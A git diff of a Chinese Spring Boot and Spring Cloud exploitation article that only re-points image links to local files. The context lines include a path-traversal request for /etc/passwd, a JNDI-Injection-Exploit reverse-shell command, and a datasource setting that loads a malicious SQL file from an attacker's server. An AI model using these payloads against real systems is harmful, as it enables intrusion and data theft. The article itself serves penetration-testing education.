@@ -49,7 +49,7 @@ schema_version: "1"
 
 **建议大家把公众号 “Z2O 安全攻防” 设为星标，否则可能就看不到啦！**因为公众号现在只对常读和星标的公众号才能展示大图推送。操作方法：点击右上角的【...】，然后点击【设为星标】即可。
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuao3T9EnGbUIqxgDhEVicCV8NbH4FiaZ3YIbpXNEr6qFicGkAelnQHKGHsVlfapMGgO3DHA68iaiac0n4Q/640?wx_fmt=png)
+![](../../.resource/remote/774a7295d451384a694d2c08387d350885fb825f8c576d8492dac0570186ab3f.png)
 
 免责声明
 ====
@@ -120,7 +120,7 @@ Spring Boot 是由 Pivotal 团队提供的全新框架，其设计目的是用�
 `/manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../`  
 修复方案：升级到 0.2.13
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuZ0ibrvNzNPR8szNSPIQL1Hlf1RcNVxU1jP7rWjRs56yy2ubF3e91nt4amCjcRibqwkN6OsRFfRFcdg/640?wx_fmt=png&from=appmsg)
+![](../../.resource/remote/d6ad6bda7a0cfb7d2310b1ec0e9e356d75fb01753c7390959cbe42b43eb0178d.png)
 
 SpringCloud
 -----------
@@ -128,7 +128,7 @@ SpringCloud
 `Spring Cloud`是基于 Spring Boot 来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合。  
 参考大师傅的一张图：
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuZ0ibrvNzNPR8szNSPIQL1HloeVkIQg0v8ic1dBO7IQYYgjN1P2qZQ3w6sR4ooiakGhHdg6l8PT803EA/640?wx_fmt=png&from=appmsg)
+![](../../.resource/remote/ed223f3e7ef75bf8ed19215e63d9905249f58373c39d18a21c143ab2f00427aa.png)
 
 ### 信息泄露漏洞
 
@@ -194,7 +194,7 @@ Spring Boot whitelabel error page 远程命令执行漏
 
 漏洞复现，测试网站是否存在`Whitelabel Error Page`，通过`fuzz`一些参数值，如`id、sid`存在`500报错`，则可以测试去执行`Spel表达式注入`
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuZ0ibrvNzNPR8szNSPIQL1HlnNWG5iaUQUWEU8icT4xicQjuJJyQKXzvN81TyMv4uia1rInM40Gk6m4THw/640?wx_fmt=png&from=appmsg)
+![](../../.resource/remote/bac7feb5bb13440b091bcd38b8ff4eff1b12af7f5ecc8999b53ab7d01276af5b.png)
 
 漏洞`poc`  
 生成 16 进制的脚本
@@ -280,11 +280,11 @@ springboot mysql jdbc deserialization 远程代码执行
 
 利用条件：访问`/env 或 /actutar/env`接口查询是否存在`mysql-connector-java 依赖`
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuZ0ibrvNzNPR8szNSPIQL1HlvS1Y0wKVUlweEZo5j8FmyhwTdeOdEQUibQK4hqSKIyLw0N39TjU6sibw/640?wx_fmt=png&from=appmsg)
+![](../../.resource/remote/326b573b2f48370101e94c568114f595522410d03ec52fdc64b8660326c13b58.png)
 
 进一步观察是否存在常见的反序列化`gadget`依赖，`如 commons- collections、Jdk7u21、Jdk8u20等`，观察版本并记录，搜索关键词`spring.datasource.url`，记录`value值(方便恢复)`
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuZ0ibrvNzNPR8szNSPIQL1HlqSiaqGBoGWaYcRYzMACA2fhiakQgoF5ibQtr7Vjh2RDQ0YdeHSoB2GayQ/640?wx_fmt=png&from=appmsg)
+![](../../.resource/remote/6b49ab048d0c69f4253d52bc5eba77673d73867b85256102a7f1aba52cdf9b18.png)
 
 漏洞利用：  
 根据属性条件进行修改调用`mysql jdbc`，判断具体情况利用，未授权可能影响业务数据，流程如下  
@@ -335,7 +335,7 @@ spring.h2.console.settings.web-allow-others=true
 利用条件：  
 存在下述界面：访问`/h2-console`
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuZ0ibrvNzNPR8szNSPIQL1HlibIrxDtsJcrgP7ynHSqD5rf2xHy5Eq9c4urygBgZbuYXepvmsyujU2w/640?wx_fmt=png&from=appmsg)
+![](../../.resource/remote/b8c3b8b71ec0e75c0ce1fb2b85443795640fb2de682f8434b61317dbfce405f7.png)
 
 漏洞利用：  
 https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0
@@ -352,11 +352,11 @@ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'bash -c {echo,反弹sh
 
 选择生成的`url links`，这里用`rmi地址`
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuZ0ibrvNzNPR8szNSPIQL1Hlam2zc81glRGX1p206Mb9Sib0ohHibiaBhuhWYF8MJ7p97Zd6sFENnpWOw/640?wx_fmt=png&from=appmsg)
+![](../../.resource/remote/79735f80511321132d89d367719470cdf9f9b029448c316476187e559d6448ab.png)
 
 监听端口成功反弹 shell![image.png]
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuZ0ibrvNzNPR8szNSPIQL1Hlam2zc81glRGX1p206Mb9Sib0ohHibiaBhuhWYF8MJ7p97Zd6sFENnpWOw/640?wx_fmt=png&from=appmsg)
+![](../../.resource/remote/79735f80511321132d89d367719470cdf9f9b029448c316476187e559d6448ab.png)
 
 jolokia logback JNDI 命令执行
 =========================
@@ -367,7 +367,7 @@ jolokia logback JNDI 命令执行
 漏洞利用：  
 访问`/jolokia/list`接口，查看是否存在`ch.qos.logback.classic`，也就是 logback 库下的 reloadByURL 可以造成 JNDI 注入
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuZ0ibrvNzNPR8szNSPIQL1Hlt4ib8n8uSibu5sQ4LVjInxUo7FeQ64jpOXLoOFd9PecvfabevUpcUoKw/640?wx_fmt=png&from=appmsg)
+![](../../.resource/remote/c35081f52513b74fb23eef1d9ef6f553b781648758d2f6524fb9f2fe5454b43d.png)
 
 步骤流程如下
 
@@ -580,7 +580,7 @@ jolokia XXE 任意文件读取
 漏洞条件：  
 访问`/jolokia/list`接口，在页面搜索`logback`，查看是否存在`logback` 库提供的`reloadByURL`方法，根据响应页面存在`logback` 库提供的`reloadByURL`方法  
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuZ0ibrvNzNPR8szNSPIQL1HlRgW0ib5VwXFkzGFljVxxmT4JA3tibKAAS9wYY6tvJon3ZegKrrM3dlzg/640?wx_fmt=png&from=appmsg)
+![](../../.resource/remote/9cff0637bcf20b0276487b4fafe31f13993826938e1fe05d607c4086297f266f.png)
 
 漏洞复现：
 
@@ -608,7 +608,7 @@ jolokia XXE 任意文件读取
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuZ0ibrvNzNPR8szNSPIQL1Hlw1uhw5QVu6zXIalKVP4xQRnxib35Ydr1m0s2gY4iclJxtQxshHXNUnkA/640?wx_fmt=png&from=appmsg)
+![](../../.resource/remote/34c7c35cc9091a6e626c80a48fb25f0b6b833cb74d20b7010347b51bf9ef72d4.png)
 
 SpringBoot Actuator 之 restart logging.config grovvy 命令执行
 ========================================================
@@ -775,17 +775,17 @@ spring.datasource.data=http://vps:port/exp.sql
 *   目前已经规划了几个月的内容：  
     
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYHyEqA6pDb8VLMp8HsIicKjI8JbTjQ6Qv5fib5NL1mUqWgkHF130FUezb0uwppCQTOnuHrw5fpLHog/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1)
+![](../../.resource/remote/732541a2d9e4ce889e1cbd7ee38a0ef3d411dbb4761fd7d5c55ce2ea036e2fc7.png)
 
 欢迎加入我们，一起学习！
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8P1KUHOKuZ9O4iae49hDfCW7hmqiaYclNdZyaia683iaEkabOCRQeXcd8TP3TUWx3wtDllnJb5f4ic8hVL69OhwDaw/640?wx_fmt=jpeg&from=appmsg)
+![](../../.resource/remote/34b8bfbaf3b2b1e8abf7c71a635db72605848dd327932d48ef901311e96f684d.jpg)
 
 ### 交流群
 
 关注公众号回复 “**加群**”，添加 Z2OBot 好友，自动拉你加入 **Z2O 安全攻防交流群 (微信群)** 分享更多好东西。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuYMO5aHRB3TbIy3xezlTAkbFzqIRfZNnicxSC23h1UmemDu9Jq38xrleA6NyoWBu1nAj0nmE6YXEHg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)
+![](../../.resource/remote/b7804659e50dbd41448064077c176b62a475da53e8500e757e79717684e92f27.png)
 
 ### 关注我们
 
